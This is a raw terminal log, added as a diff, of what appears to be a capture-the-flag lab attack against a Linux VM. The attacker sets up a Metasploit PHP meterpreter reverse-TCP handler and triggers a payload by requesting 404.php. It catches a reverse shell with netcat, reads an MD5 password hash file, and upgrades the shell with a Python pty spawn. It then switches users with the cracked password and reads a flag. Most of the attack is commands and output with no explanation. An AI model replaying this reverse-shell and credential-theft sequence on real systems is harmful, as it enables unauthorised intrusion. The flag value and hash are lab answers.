@@ -1,0 +1,269 @@
+root@kali:~# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.124.97  netmask 255.255.255.0  broadcast 192.168.124.255
+        inet6 fe80::5054:ff:fe87:ceb4  prefixlen 64  scopeid 0x20<link>
+        ether 52:54:00:87:ce:b4  txqueuelen 1000  (Ethernet)
+        RX packets 1216  bytes 1571344 (1.4 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 236  bytes 19626 (19.1 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 1063
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 20  bytes 1116 (1.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 20  bytes 1116 (1.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@kali:~# msfconsole
+[-] ***rting the MetaspLoit Framework console...\
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v5.0.20-dev                          ]
++ -- --=[ 1886 exploits - 1065 auxiliary - 328 post       ]
++ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf5 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf5 exploit(multi/handler) > set LHOST 192.168.124.187
+LHOST => 192.168.124.187
+msf5 exploit(multi/handler) > exploit -j -z
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.124.187:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+msf5 exploit(multi/handler) > stop
+[-] Unknown command: stop.
+msf5 exploit(multi/handler) > exit
+root@kali:~# curl http://192.168.124.187/404.php
+root@kali:~# curl http://192.168.124.187/404.php
+Connection refused (111)
+root@kali:~# nc -lvp 4444
+listening on [any] 4444 ...
+^C
+root@kali:~# nc --help
+nc: invalid option -- '-'
+nc -h for help
+root@kali:~# nc -h
+[v1.10-41.1]
+connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
+listen for inbound:	nc -l -p port [-options] [hostname] [port]
+options:
+	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
+	-b			allow broadcasts
+	-g gateway		source-routing hop point[s], up to 8
+	-G num			source-routing pointer: 4, 8, 12, ...
+	-h			this cruft
+	-i secs			delay interval for lines sent, ports scanned
+        -k                      set keepalive option on socket
+	-l			listen mode, for inbound connects
+	-n			numeric-only IP addresses, no DNS
+	-o file			hex dump of traffic
+	-p port			local port number
+	-r			randomize local and remote ports
+	-q secs			quit after EOF on stdin and delay of secs
+	-s addr			local source address
+	-T tos			set Type Of Service
+	-t			answer TELNET negotiation
+	-u			UDP mode
+	-v			verbose [use twice to be more verbose]
+	-w secs			timeout for connects and final net reads
+	-C			Send CRLF as line-ending
+	-z			zero-I/O mode [used for scanning]
+port numbers can be individual or ranges: lo-hi [inclusive];
+hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
+root@kali:~# nc -lp 4444
+^C
+root@kali:~# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [192.168.124.97] from linux [192.168.124.187] 60199
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 19:43:24 up  4:10,  0 users,  load average: 0.27, 0.08, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cd home
+$ ls
+robot
+$ cd robot
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ vim key-2-of-3.txt
+/bin/sh: 7: vim: not found
+$ cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ git version
+/bin/sh: 10: git: not found
+$ cd ..
+$ pwd
+/home
+$ cd ..
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cd root
+/bin/sh: 15: cd: can't cd to root
+$ whoami
+daemon
+$ cd home/robot
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ -su robot
+/bin/sh: 19: -su: not found
+$ su - robot
+su: must be run from a terminal
+$ su- robot
+/bin/sh: 21: su-: not found
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+$ su - robot
+su - robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+$ whoami
+whoami
+robot
+$ ls 
+ls
+key-2-of-3.txt	password.raw-md5
+$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+$ cd ..
+cd ..
+$ cd ..
+cd ..
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ cd root
+cd root
+-su: cd: root: Permission denied
+$ w
+w
+ 19:56:55 up  4:24,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+$ sudo w
+sudo w
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+$ who
+who
+$ sudo who
+sudo who
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+$ sudo root
+sudo root
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+$ 
+
